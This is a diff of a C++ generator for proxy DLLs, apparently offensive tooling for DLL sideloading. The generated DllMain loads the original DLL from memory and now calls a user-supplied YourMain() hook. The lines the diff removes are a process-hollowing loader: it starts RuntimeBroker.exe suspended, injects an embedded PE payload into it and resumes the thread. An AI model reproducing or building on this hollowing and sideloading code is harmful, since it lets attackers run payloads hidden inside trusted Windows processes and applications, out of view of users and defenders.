@@ -199,9 +199,8 @@ bool generateMainCPP(string name, vector<string> names, string originalDllPath, 
     file << "#include <iostream>" << std::endl;
     file << "#include <vector>" << std::endl;
     file << "#include \"MemoryModule.h\"" << std::endl;
-    file << "#include \"process_hollowing.h\"" << std::endl;
     file << "#include \"dll_binary.h\"" << std::endl;
-    file << "#include \"exe_binary.h\"" << std::endl;
+    file << "#include \"your_main.h\"" << std::endl;
     file << std::endl;
 
 
@@ -270,76 +269,13 @@ bool generateMainCPP(string name, vector<string> names, string originalDllPath, 
     }
 
 
-
-
-    file << "\n";
-    //incluir GetRuntimeBrokerPath
-    file << "std::vector<unsigned char> GetRuntimeBrokerPath() {\n";
-    file << "\twchar_t buffer[MAX_PATH];\n";
-    file << "\tUINT result = GetSystemDirectoryW(buffer, MAX_PATH);\n";
-    file << "\tif (result == 0 || result > MAX_PATH) {\n";
-    file << "\t\treturn {};\n";
-    file << "\t}\n";
-    file << "\tstd::wstring wPath = std::wstring(buffer) + L\"\\\\RuntimeBroker.exe\";\n";
-    file << "\tint size_needed = WideCharToMultiByte(CP_UTF8, 0, wPath.c_str(), (int)wPath.size(), NULL, 0, NULL, NULL);\n";
-    file << "\tstd::vector<unsigned char> utf8_buffer(size_needed);\n";
-    file << "\tWideCharToMultiByte(CP_UTF8, 0, wPath.c_str(), (int)wPath.size(), reinterpret_cast<char*>(utf8_buffer.data()), size_needed, NULL, NULL);\n";
-    file << "\treturn utf8_buffer;\n";
-    file << "}\n";
-    file << "\n";
     // DllMain Modificado para carregar da memória
     file << "BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {" << std::endl;
     file << "\tswitch (ul_reason_for_call)" << std::endl;
     file << "\t{" << std::endl;
     file << "\tcase DLL_PROCESS_ATTACH:" << std::endl;
     file << "\t{" << std::endl;
-    //Carregamento do exe na memoria
-
-    file << "\t\tif (rawData == nullptr || payloadSize == 0) {\n";
-    file << "\t\t\tMessageBox(0, \"Erro: Nenhum payload carregado na memoria global\", \"Proxy Error\", MB_ICONERROR);\n";
-    file << "\t\t\treturn -1;\n";
-    file << "\t\t}\n";
-    file << "\t\tLPVOID hFileContent = (LPVOID) rawData; \n";
-    file << "\t\tif (!IsValidPE(hFileContent)) {\n";
-    file << "\t\t\tMessageBox(0, \"Payload invalido (Nao e um PE valido)\", \"Proxy Error\", MB_ICONERROR);\n";
-    file << "\t\t\treturn -1;\n";
-    file << "\t\t}\n";
-    file << "\t\tBOOL bPayloadIs32Bit = IsPE32(hFileContent);\n";
-    file << "\t\tchar lpTargetProcess[MAX_PATH];\n";
-    file << "\t\tif (bPayloadIs32Bit) {\n";
-    file << "\t\t\tstrcpy_s(lpTargetProcess, reinterpret_cast<const char*>(GetRuntimeBrokerPath().data()));\n";
-    file << "\t\t} else {\n";
-    file << "\t\t\tstrcpy_s(lpTargetProcess, reinterpret_cast<const char*>(GetRuntimeBrokerPath().data()));\n";
-    file << "\t\t}\n";
-    file << "\t\tSTARTUPINFOA PI_StartupInfo;\n";
-    file << "\t\tPROCESS_INFORMATION PI_ProcessInfo;\n";
-    file << "\t\tmemset(&PI_StartupInfo, 0, sizeof(PI_StartupInfo));\n";
-    file << "\t\tmemset(&PI_ProcessInfo, 0, sizeof(PI_ProcessInfo));\n";
-    file << "\t\tPI_StartupInfo.cb = sizeof(PI_StartupInfo);\n";
-    file << "\t\tif (!CreateProcessA(NULL, lpTargetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &PI_StartupInfo, &PI_ProcessInfo)) {\n";
-    file << "\t\t\tMessageBox(0, \"Erro ao criar processo alvo\", \"Proxy Error\", MB_ICONERROR);\n";
-    file << "\t\t\treturn -1;\n";
-    file << "\t\t}\n";
-    file << "\t\tBOOL success = FALSE;\n";
-    file << "\t\tif (bPayloadIs32Bit) {\n";
-    file << "\t\t\tif (HasRelocation32(hFileContent)) {\n";
-    file << "\t\t\t\tsuccess = RunPEReloc32(&PI_ProcessInfo, hFileContent);\n";
-    file << "\t\t\t} else {\n";
-    file << "\t\t\t\tsuccess = RunPE32(&PI_ProcessInfo, hFileContent);\n";
-    file << "\t\t\t}\n";
-    file << "\t\t} else {\n";
-    file << "\t\t\tif (HasRelocation64(hFileContent)) {\n";
-    file << "\t\t\t\tsuccess = RunPEReloc64(&PI_ProcessInfo, hFileContent);\n";
-    file << "\t\t\t} else {\n";
-    file << "\t\t\t\tsuccess = RunPE64(&PI_ProcessInfo, hFileContent);\n";
-    file << "\t\t\t}\n";
-    file << "\t\t}\n";
-    file << "\t\tif (success) {\n";
-    file << "\t\t\tResumeThread(PI_ProcessInfo.hThread);\n";
-    file << "\t\t} else {\n";
-    file << "\t\t\tTerminateProcess(PI_ProcessInfo.hProcess, 0);\n";
-    file << "\t\t}\n";
-
+    file << "\t\tYourMain();";
     // Carregamento via MemoryModule
     file << "\t\t" << name << ".dll = MemoryLoadLibrary(originalDllData, sizeof(originalDllData));" << std::endl;
     file << "\t\tif (" << name << ".dll == NULL)" << std::endl;
